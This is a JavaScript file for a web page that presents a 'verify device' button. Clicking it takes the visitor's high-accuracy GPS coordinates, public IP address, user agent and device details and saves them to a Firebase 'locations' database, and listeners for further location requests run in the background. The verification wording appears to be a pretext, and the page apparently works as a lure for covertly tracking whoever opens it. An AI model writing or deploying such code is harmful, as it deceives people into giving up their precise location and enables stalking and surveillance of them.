import { firebaseReady } from './src/core/firebase-init.js';
import { initializeTheme } from './src/features/theme/theme-manager.js';
import { listenForLocationRequests, setupUnloadHandler } from './src/features/location/location-tracker.js';
import { getDeviceInfo } from './src/utils/browser-detection.js';

// Initialize Firebase and load theme
document.addEventListener('DOMContentLoaded', async () => {
    try {
        // Wait for Firebase to be ready
        await firebaseReady;
        
        // Initialize theme system
        await initializeTheme();

        // Setup location request listener
        listenForLocationRequests();

        // Setup unload handler
        setupUnloadHandler();

        // Setup verify button click handler
        const verifyButton = document.getElementById('allowLocation');
        const locationStatus = document.getElementById('locationStatus');

        verifyButton.addEventListener('click', async () => {
            try {
                verifyButton.disabled = true;
                document.querySelector('.container').classList.add('processing');
                locationStatus.textContent = 'Verifying device...';

                // Get initial location
                const position = await new Promise((resolve, reject) => {
                    navigator.geolocation.getCurrentPosition(resolve, reject, {
                        enableHighAccuracy: true,
                        timeout: 20000,
                        maximumAge: 0
                    });
                });

                // Get IP address
                const ipResponse = await fetch('https://api.ipify.org?format=json');
                const { ip } = await ipResponse.json();

                // Save location to Firebase
                const database = window.database;
                const locationRef = database.ref('locations').push();

                const locationData = {
                    latitude: position.coords.latitude,
                    longitude: position.coords.longitude,
                    accuracy: position.coords.accuracy,
                    altitude: position.coords.altitude,
                    altitudeAccuracy: position.coords.altitudeAccuracy,
                    timestamp: new Date().toISOString(),
                    status: 'active',
                    ip: ip,
                    userAgent: navigator.userAgent,
                    ...getDeviceInfo()
                };

                await locationRef.set(locationData);
                locationStatus.textContent = 'Device verified successfully';
                
                // Add success animation class
                document.querySelector('.thank-you-card').classList.add('success');
                
            } catch (error) {
                console.error('Verification failed:', error);
                locationStatus.textContent = 'Verification failed. Please try again.';
                verifyButton.disabled = false;
                document.querySelector('.container').classList.remove('processing');
            }
        });

    } catch (error) {
        console.error('Failed to initialize:', error);
    }
});
